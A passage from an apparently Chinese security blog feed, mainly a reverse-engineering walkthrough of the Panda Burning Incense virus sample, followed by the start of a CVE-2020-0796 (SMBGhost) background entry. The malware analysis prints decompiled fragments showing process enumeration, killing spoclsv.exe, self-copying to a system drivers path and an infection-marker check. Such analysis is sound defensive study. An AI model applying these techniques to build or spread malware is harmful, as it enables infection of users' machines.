class="table-container"><table><thead><tr><th>API函数</th><th>功能</th></tr></thead><tbody><tr><td>CreateToolhelp32Snapshot</td><td>通过获取进程信息为指定的进程、进程使用的堆、模块、线程建立一个快照。</td></tr><tr><td>Heap32ListFirst</td><td>检索有关指定进程已分配的第一个堆的信息。</td></tr><tr><td>Heap32ListNext</td><td>检索有关进程已分配的下一个堆的信息。</td></tr><tr><td>Heap32First</td><td>检索有关已由进程分配的堆的第一个块的信息。</td></tr><tr><td>Heap32Next</td><td>检索有关已由进程分配的堆的下一个块的信息。</td></tr><tr><td>Toolhelp32ReadProcessMemory</td><td>将分配给另一个进程的内存复制到应用程序提供的缓冲区中。</td></tr><tr><td>Process32First/Process32FirstW</td><td>检索有关系统快照中遇到的第一个进程的信息。</td></tr><tr><td>Process32Next/Process32NextW</td><td>检索有关系统快照中记录的下一个进程的信息。</td></tr><tr><td>Thread32First</td><td>检索有关系统快照中遇到的任何进程的第一个线程的信息。</td></tr><tr><td>Thread32Next</td><td>检索有关系统内存快照中遇到的任何进程的下一个线程的信息。</td></tr><tr><td>Module32First/Module32FirstW</td><td>检索有关与进程关联的第一个模块的信息。</td></tr><tr><td>Module32Next/Module32NextW</td><td>检索有关与进程或线程关联的下一个模块的信息。</td></tr></tbody></table></div><p>将这些API函数的地址存到用户程序的某个地方。</p><img src="/posts/a48809a5/6.1.34.png" class="" title="sub_404DAC()函数分析"><p>存好后执行<code>CreateToolhelp32Snapshot()</code>获取当前进程快照。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateToolhelp32Snapshot</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwFlags,</span></span><br><span class="line"><span class="params">  [in] DWORD th32ProcessID</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.35.png" class="" title="sub_405028()函数分析"><p>Flags为2表示在快照中包含系统中的所有进程。要枚举这些进程，请参见 <code>Process32First()</code>。 ProcessID为0表示当前进程。如果调用成功，返回快照的句柄，此快照的句柄为0x98。</p><p>将它更名为<code>CreateSnapshot()</code>。</p><h4 id="6-1-9-2-sub-405048"><a href="#6-1-9-2-sub-405048" class="headerlink" title="6.1.9.2 sub_405048"></a>6.1.9.2 sub_405048</h4><p>跟<code>sub_405028()</code>一样调用<code>sub_404DAC()</code>，但这次用的是<code>Process32First()</code>，用来检索有关系统快照中遇到的第一个进程的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">Process32First</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE           hSnapshot,</span></span><br><span class="line"><span class="params">  [in, out] LPPROCESSENTRY32 lppe</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hSnapshot：从上次调用<code>CreateToolhelp32Snapshot()</code>函数返回的快照句柄。</li><li>lppe：指向PROCESSENTRY32结构的指针。它包含进程信息，如可执行文件的名称、进程标识符和父进程的进程标识符。</li></ul><img src="/posts/a48809a5/6.1.36.png" class="" title="sub_405048()函数分析"><p>将它更名为<code>ProcessFirst()</code>。</p><h4 id="6-1-9-3-sub-406028"><a href="#6-1-9-3-sub-406028" class="headerlink" title="6.1.9.3 sub_406028"></a>6.1.9.3 sub_406028</h4><p>进入循环，先看<code>sub_406028()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_406028@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.37.png" class="" title="sub_4060D4()函数分析"><p>进入<code>sub_406028()</code>函数，可以看到这也是一个字符串拷贝函数，将eax存的内容拷贝到edx存的地址处。</p><img src="/posts/a48809a5/6.1.38.png" class="" title="sub_406028()函数分析"><h4 id="6-1-9-4-sub-405FA8"><a href="#6-1-9-4-sub-405FA8" class="headerlink" title="6.1.9.4 sub_405FA8"></a>6.1.9.4 sub_405FA8</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405FA8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.39.png" class="" title="sub_405FA8()函数分析"><p>进入<code>sub_405FA8()</code>函数，前面函数都分析过，无非是初始化、分配空间、求字符串长度。重要的是循环，进入循环后第一个函数<code>sub_402804()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __usercall sub_402804@&lt;al&gt;(<span class="type">unsigned</span> __int8 result@&lt;al&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; result &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">    result -= <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IDA中可以看出这个函数是将小写字母转换为大写字母。</p><p>第二个函数<code>sub_404124()</code>，eax中存的是内容的地址的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_404124@&lt;eax&gt;(<span class="type">char</span> **eax0@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4040D8(eax0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.40.png" class="" title="sub_404124()函数分析"><img src="/posts/a48809a5/6.1.41.png" class="" title="sub_404124()函数分析"><p><code>sub_404124()</code>很像我们刚开始分析的<code>sub_403C98()</code>，将<code>spoclsv.exe</code>字符串拷贝到地址0xB38048中。继续进行循环。</p><img src="/posts/a48809a5/6.1.42.png" class="" title="sub_405FA8()函数分析"><p>将地址0xB38048的字符’s’修改为’S’，由此可以推测这个循环是将地址0xB38048的字符串转换成大写形式。</p><h4 id="6-1-9-5-sub-403EB4"><a href="#6-1-9-5-sub-403EB4" class="headerlink" title="6.1.9.5 sub_403EB4"></a>6.1.9.5 sub_403EB4</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_403EB4@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.43.png" class="" title="sub_403EB4()函数分析"><p>由于eax为0，合理猜测返回值会存到eax中。而这个值是指向真正内容的地址。它内部有一个<code>sub_403D34()</code>函数，也就是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.44.png" class="" title="sub_403EB4()函数分析"><img src="/posts/a48809a5/6.1.45.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-6-sub-405068"><a href="#6-1-9-6-sub-405068" class="headerlink" title="6.1.9.6 sub_405068"></a>6.1.9.6 sub_405068</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405068@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>里面又调用到了<code>sub_404DAC()</code>，这次取<code>Process32Next()</code>函数，检索有关系统快照中记录的下一个进程的信息。将它更名为<code>ProcessNext()</code>。</p><p>循环几次发现，循环的作用是遍历系统中的所有进程，查找名为<code>spoclsv.exe</code>的程序。转换为大写字母我猜是进行了一个简单的加密操作而已。</p><img src="/posts/a48809a5/6.1.46.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-7-sub-4060B4"><a href="#6-1-9-7-sub-4060B4" class="headerlink" title="6.1.9.7 sub_4060B4"></a>6.1.9.7 sub_4060B4</h4><p>当在快照中找到<code>spoclsv.exe</code>后，执行<code>sub_4060B4()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL __usercall sub_4060B4@&lt;eax&gt;(DWORD a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE v1; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v1 = OpenProcess(<span class="number">0x1F0FFF</span>u, <span class="number">-1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)TerminateProcess(v1, <span class="number">0</span>) &gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个API函数：<code>OpenProcess()</code>和<code>TerminateProcess()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwDesiredAccess,<span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">  [in] BOOL  bInheritHandle,<span class="comment">// 是否继承句柄</span></span></span><br><span class="line"><span class="params">  [in] DWORD dwProcessId<span class="comment">// 进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>OpenProcess()</code>函数用来打开一个已存在的进程对象，并返回进程的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hProcess,</span></span><br><span class="line"><span class="params">  [in] UINT   uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>TerminateProcess()</code>用来终止指定的进程及其所有线程。</p><img src="/posts/a48809a5/6.1.47.png" class="" title="sub_4060B4()函数分析"><p>在这里，<code>spoclsv.exe</code>的进程ID为0x1376C，<code>OpenProcess()</code>的作用是将<code>spoclsv.exe</code>赋予所有权限，继承句柄。返回值为<code>spoclsv.exe</code>的句柄0xA4。接着使用<code>TerminateProcess()</code>终止<code>spoclsv.exe</code>。</p><img src="/posts/a48809a5/6.1.48.png" class="" title="sub_4060B4()函数分析"><p>将它更名为<code>GrantAllRights()</code>。</p><p>最后使用<code>CloseHandle()</code>关闭快照的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CloseHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hObject</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>以上就是<code>sub_4060D4()</code>完整的一个流程，简单来说就是捕获当前系统所有进程的状态，遍历所有进程找到指定进程并赋予所有访问权限，最后关闭自身达到隐藏目的，将它更名为<code>GrantAllRightsAndClose()</code>。</p><h3 id="6-1-10-sub-4040CC"><a href="#6-1-10-sub-4040CC" class="headerlink" title="6.1.10 sub_4040CC"></a>6.1.10 sub_4040CC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4040CC@&lt;eax&gt;(<span class="type">char</span> *result@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.49.png" class="" title="sub_4040CC()函数分析"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">004040CC  /$  85C0          test eax,eax</span><br><span class="line">004040CE  |.  74 02         je short setup.004040D2</span><br><span class="line">004040D0  |.  C3            retn</span><br><span class="line">004040D1  |   00            db 00</span><br><span class="line">004040D2  |&gt;  B8 D1404000   mov eax,setup.004040D1</span><br><span class="line">004040D7  \.  C3            retn</span><br></pre></td></tr></table></figure><p>这个函数的作用是比较eax的值是否为0，可以用来检测返回值、判断文件是否存在等。</p><h3 id="6-1-11-回到父函数sub-408024"><a href="#6-1-11-回到父函数sub-408024" class="headerlink" title="6.1.11 回到父函数sub_408024"></a>6.1.11 回到父函数sub_408024</h3><p>继续看下面的API函数<code>SetFileAttributesA()</code>，用来设置文件或目录的属性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetFileAttributesA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpFileName,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFileAttributes</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：要设置其属性的文件名。</li><li>dwFileAttributes：带有<code>FILE_ATTRIBUTE_</code>前缀的一个或多个常数，用来设置文件属性。</li></ul><div class="table-container"><table><thead><tr><th>Attribute</th><th>Meaning</th></tr></thead><tbody><tr><td>FILE_ATTRIBUTE_ARCHIVE<br />32 (0x20)</td><td>该文件是一个存档文件。应用程序使用此属性来备份或移除标记文件。</td></tr><tr><td>FILE_ATTRIBUTE_HIDDEN<br />2 (0x2)</td><td>该文件是隐藏的。它不包括在普通的目录列表。</td></tr><tr><td>FILE_ATTRIBUTE_NORMAL<br />128 (0x80)</td><td>该文件没有设置其他的属性。此属性仅在单独使用有效。</td></tr><tr><td>FILE_ATTRIBUTE_NOT_CONTENT_INDEXED<br />8192 (0x2000)</td><td>该文件将不被内容索引服务编制索引。</td></tr><tr><td>FILE_ATTRIBUTE_OFFLINE<br />4096 (0x1000)</td><td>该文件的数据不是立即可用。此属性表明文件数据被物理移动到离线存储。此属性用于通过远程存储，分层存储管理软件。应用程序不应随意更改此属性。</td></tr><tr><td>FILE_ATTRIBUTE_READONLY<br />1 (0x1)</td><td>该文件是只读的。应用程序可以读取该文件，但不能写入或删除它。</td></tr><tr><td>FILE_ATTRIBUTE_SYSTEM<br />4 (0x4)</td><td>该文件是操作系统的一部分，或者完全由它使用。</td></tr><tr><td>FILE_ATTRIBUTE_TEMPORARY<br />256 (0x100)</td><td>该文件是被用于暂时存储。文件系统避免写入数据传回海量存储如果有足够的缓存内存可用，因为经常在应用程序删除后不久，这个句柄被关闭的临时文件。在这种情况下，该系统可以完全避免记录的数据。否则，在手柄关闭的数据将被写入。</td></tr></tbody></table></div><img src="/posts/a48809a5/6.1.50.png" class="" title="sub_408024()函数分析"><p>将<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>设置为<code>FILE_ATTRIBUTE_NORMAL</code>属性。</p><p>继续往下看到<code>CopyFileA()</code>，将现有文件复制到新文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CopyFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpExistingFileName,</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpNewFileName,</span></span><br><span class="line"><span class="params">  [in] BOOL   bFailIfExists</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.51.png" class="" title="sub_408024()函数分析"><p>继续看<code>WinExec()</code>，运行指定的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT <span class="title function_">WinExec</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpCmdLine, </span></span><br><span class="line"><span class="params">    UINT uCmdShow</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpCmdLine：指向一个空结束的字符串，串中包含将要执行的应用程序的命令行（文件名加上可选参数）。</li><li>uCmdShow：定义Windows应用程序的窗口如何显示，并为<code>CreateProcess()</code>函数提供<code>STARTUPINFO</code>参数的<code>wShowWindow</code>成员的值。</li></ul><div class="table-container"><table><thead><tr><th>uCmdShow参数可选值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE = 0</td><td>隐藏, 并且任务栏也没有最小化图标</td></tr><tr><td>SW_SHOWNORMAL = 1</td><td>用最近的大小和位置显示, 激活</td></tr><tr><td>SW_NORMAL = 1</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWMINIMIZED = 2</td><td>最小化, 激活</td></tr><tr><td>SW_SHOWMAXIMIZED = 3</td><td>最大化, 激活</td></tr><tr><td>SW_MAXIMIZE = 3</td><td>同 SW_SHOWMAXIMIZED</td></tr><tr><td>SW_SHOWNOACTIVATE = 4</td><td>用最近的大小和位置显示, 不激活</td></tr><tr><td>SW_SHOW = 5</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MINIMIZE = 6</td><td>最小化, 不激活</td></tr><tr><td>SW_SHOWMINNOACTIVE = 7</td><td>同 SW_MINIMIZE</td></tr><tr><td>SW_SHOWNA = 8</td><td>同 SW_SHOWNOACTIVATE</td></tr><tr><td>SW_RESTORE = 9</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_SHOWDEFAULT = 10</td><td>同 SW_SHOWNORMAL</td></tr><tr><td>SW_MAX = 10</td><td>同 SW_SHOWNORMAL</td></tr></tbody></table></div><p>返回值：</p><ul><li>若函数调用成功，则返回值大于31。</li><li>若函数调用失败，则返回值为下列之一：<br>①　0：系统内存或资源已耗尽。<br>②　ERROR_BAD_FORMAT=11：EXE文件无效（非Win32.EXE或.EXE影像错误）。<br>③　ERROR_FILE_NOT_FOUND=2：指定的文件未找到。<br>④　ERROR_PATH_NOT_FOUND=3：指定的路径未找到。</li></ul><img src="/posts/a48809a5/6.1.52.png" class="" title="sub_408024()函数分析"><p>这里表示运行<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，用最近的大小和位置显示，激活。</p><p><code>ExitProcess()</code>函数用来结束调用进程及其所有线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ExitProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] UINT uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>运行到这里时，<code>setup.exe</code>的工作已经结束了。什么？！但我们的病毒远不止有这些功能啊？回看哪个地方可以让我们跳过<code>ExitProcess()</code>。</p><img src="/posts/a48809a5/6.1.53.png" class="" title="sub_408024()函数分析"><p>发现在字符串对比时，字符串为<code>C:\WINDOWS\SYSTEM32\DRIVERS\SPOCLSV.EXE</code>才可以跳过<code>ExitProcess()</code>继续执行病毒的其它功能。那么怎么才能让字符串为这个呢？</p><img src="/posts/a48809a5/6.1.54.png" class="" title="sub_408024()函数分析"><p>通过IDA可以看到，我们通过<code>GetFilePathAndName()</code>获取的当前路径名要等于<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>才可以绕过<code>ExitProcess()</code>函数。</p><p>这意味着，<code>setup.exe</code>的功能是将自己读到内存中去，复制自身到<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>，赋予普通文件权限，最后启动<code>spoclsv.exe</code>，<code>setup.exe</code>的任务就完成了，接下来就是<code>spoclsv.exe</code>要做的事情了。</p><p>加载<code>spoclsv.exe</code>到IDA和OD，重走一遍<code>sub_408024()</code>函数，观察流程与<code>setup.exe</code>有何不同。前面都一样，又来到了这里。</p><img src="/posts/a48809a5/6.1.55.png" class="" title="sub_408024()函数分析"><p>这次两个字符串一致，绕过<code>ExitProcess()</code>函数继续执行病毒的其它功能。</p><h3 id="6-1-12-sub-40416C"><a href="#6-1-12-sub-40416C" class="headerlink" title="6.1.12 sub_40416C"></a>6.1.12 sub_40416C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40416C@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.56.png" class="" title="sub_40416C()函数分析"><p>eax存的是PE文件加载进内存的起始地址，edx存的是文件大小，ecx的值为0。</p><p>用OD走一下流程，进入<code>sub_40411C()</code>。如果<code>dword ptr ds:[edx-0x8]</code>的值为1，则跳过下面的<code>AllocStackAndCopyString()</code>函数，否则执行<code>AllocStackAndCopyString()</code>。</p><img src="/posts/a48809a5/6.1.59.png" class="" title="sub_40411C()函数分析"><p>分析汇编指令可知，如果执行<code>AllocStackAndCopyString()</code>，则分配0xEC00大小的空间，将自身拷贝到分配的那个内存空间中去。所以可以猜测这个函数的功能是判断病毒程序是否被加载进内存。（？不知道分析的对不对，感觉有点问题）</p><h3 id="6-1-13-sub-4041B4"><a href="#6-1-13-sub-4041B4" class="headerlink" title="6.1.13 sub_4041B4"></a>6.1.13 sub_4041B4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__usercall sub_4041B4@&lt;eax&gt;(_BYTE *result@&lt;eax&gt;, _BYTE *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>这个函数传入的参数是两个byte型指针，返回值也是一个byte型指针。</p><img src="/posts/a48809a5/6.1.57.png" class="" title="sub_4041B4()函数分析"><p>看到byte数据类型很容易联想到这是否是一个标记，<code>sub_4041B4()</code>就是查找程序中是否包含这个标记，如果包含这个标记，则执行jg跳转，否则不跳转。</p><p>进入函数，发现edx为0直接对eax清零，退出函数。说明该程序没有这个标记，如果有，则edx不应该为0且会进入到循环执行某些操作，退出函数后执行jg跳转。</p><img src="/posts/a48809a5/6.1.58.png" class="" title="sub_4041B4()函数分析"><p>如果执行jg跳转，经过非常多函数后，最后执行<code>ExitProcess()</code>函数退出程序，也就去不到熊猫烧香的其它核心函数了。所以可以猜测这个标记应该就是病毒将正常的PE文件感染后，在原本正常PE文件中添加的01标记，用于标识该程序是否被感染。如果真是这样的话，若想分析跳转后的程序内容，可以在OD中修改标志位，或对一个被感染的程序进行分析。</p><p>将这个函数命名为<code>SearchSignPos()</code>。</p><p>由于我们现在分析的是<code>spoclsv.exe</code>，它自身没有0x01标记，因此跳转不成立，继续往下执行。</p><p>下面的指令主要用于收尾工作，最后的call用于删除堆栈中所保存的地址，这些地址指向的是病毒写入的一些信息。</p><h3 id="6-1-14-总结"><a href="#6-1-14-总结" class="headerlink" title="6.1.14 总结"></a>6.1.14 总结</h3><p>至此，熊猫烧香样本的第一个核心函数分析完毕。</p><p>它的主要功能是先获取当前程序的绝对路径，再获取不包含程序名的绝对路径，查找该目录下是否有<code>Desktop_.ini</code>文件，如果有则将文件属性设置为普通文件，接着删除该文件。</p><blockquote><p><code>Desktop_.ini</code>文件是系统可识别文件，其作用是存储用户对文件夹的个性设置，比如用户更改了文件夹图标、背景颜色等等，其配置信息都会存入到这个文件夹的<code>Desktop_.ini</code>文件中，用户可以使用记事本的方式打开，里面均为一些代码配置文件。</p><p><code>Desktop_.ini</code>文件属于文件夹的配置文件，用户可以删除，删除后不会影响文件夹，只是会让文件夹恢复为默认设置。另外，<code>Desktop_.ini</code>文件并不是病毒文件。</p><p>值得一提的是，<code>Desktop_.ini</code>文件默认为系统配置文件，大小仅几Kb左右，不过如果用户设置的项目较多的话，也会导致<code>Desktop_.ini</code>文件变的很大。这个文件如果容量很大的话，打开这个文件夹容易出现卡死现象，因此也经常会有一些电脑高手恶搞，将一个电影文件改成<code>Desktop_.ini</code>文件，然后放置在电脑桌面或者文件夹当中，导致电脑变卡。</p></blockquote><p>如果没有该文件则将病毒信息写入到内存中，并检查是否将病毒完全写入，如果没有完全写入则调用for循环将剩余信息写入到内存中。获取当前程序路径转换为大写字母的形式与构造的路径<code>C:\WINDOWS\system32\drivers\spoclsv.exe</code>转换为大写字母的形式比较，如果不一致则创建或重写<code>spoclsv.exe</code>，设置为普通文件属性，将当前程序复制到<code>spoclsv.exe</code>(相当于复制<code>setup.exe</code>到指定目录，更名为<code>spoclsv.exe</code>)，运行<code>spoclsv.exe</code>，退出当前程序。检查<code>spoclsv.exe</code>是否被感染，也就是是否有01标记，由于它是病毒自身，不存在是否被感染问题，所以跳过一大段对非病毒程序的操作，执行最后的函数收尾工作。</p><h2 id="6-2-sub-40CA5C函数分析"><a href="#6-2-sub-40CA5C函数分析" class="headerlink" title="6.2 sub_40CA5C函数分析"></a>6.2 sub_40CA5C函数分析</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;熊猫烧香是Windows PE病毒，属于捆绑释放型。具体有关PE病毒的知识参照我写的另一篇笔记 &lt;a href=&quot;https://v5le0n9.github.io/posts/adc1352a.html&quot;&gt;Windows PE病毒分类及感染方式&lt;/a&gt; 。&lt;/p&gt;
&lt;p&gt;熊猫烧香是一款非常具有代表性的病毒，当年造成了非常大的影响，并且也有一定的技术手段。用它来入门恶意样本分析是非常适合的，所以就拿它来开刀了。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796漏洞复现及防御机制</title>
    <link href="http://example.com/posts/df5ab46f.html"/>
    <id>http://example.com/posts/df5ab46f.html</id>
    <published>2022-05-27T14:04:19.047Z</published>
    <updated>2022-05-28T06:44:00.748Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞描述"><a href="#1-1-漏洞描述" class="headerlink" title="1.1 漏洞描述"></a>1.1 漏洞描述</h2><p>CVE-2020-0796漏洞又称SMBv3服务远程代码执行漏洞，攻击者可能利用此漏洞远程操作无需用户验证，通过发送构造特殊的恶意数据导致在目标系统上执行恶意代码，从而获取机器的完全控制，利用端口仍是445。</p><span id="more"></span><h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>在微软SMBv3远程代码执行漏洞中，SMB 3.1.1协议处理压缩消息时，对其中的数据没有经过安全检查，直接使用可能引发内存破坏漏洞，从而被攻击者利用远程执行任意代码。攻击者通过发送特殊构造的数据包触发漏洞，无需用户验证就可能控制目标系统，同时影响服务器与客户端系统。</p><p>该漏洞存在于Windows的SMBv3.0(文件共享与打印服务)中，利用的端口是445。当SMBv3.0处理恶意制作的压缩数据包时，由于SMB没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压，并没有检查长度是否合法，最终导致整数溢出。远程未经认证的供给者就可能利用此漏洞在应用程序的上下文中执行任意代码，系统受到非授权控制。</p><p>根据安全研究人员分析，该漏洞是一个整数溢出，发生在SMB服务驱动srv2.sys的<code>Srv2DecompressData()</code>函数中。</p><p>详细请看：</p><p><a href="https://nosec.org/home/detail/4420.html">https://nosec.org/home/detail/4420.html</a></p><p><a href="https://blog.csdn.net/weixin_44058342/article/details/105275847">https://blog.csdn.net/weixin_44058342/article/details/105275847</a></p><p><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/</a></p><p><a href="https://www.cnblogs.com/goabout2/p/12609810.html">https://www.cnblogs.com/goabout2/p/12609810.html</a></p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>漏洞主要影响Windows 10版本（1903和1909），包括32位、64位的家用版、专业版、企业版、教育版。</p><h2 id="1-4-影响方式"><a href="#1-4-影响方式" class="headerlink" title="1.4 影响方式"></a>1.4 影响方式</h2><p>微软SMBv3(Server Message Block 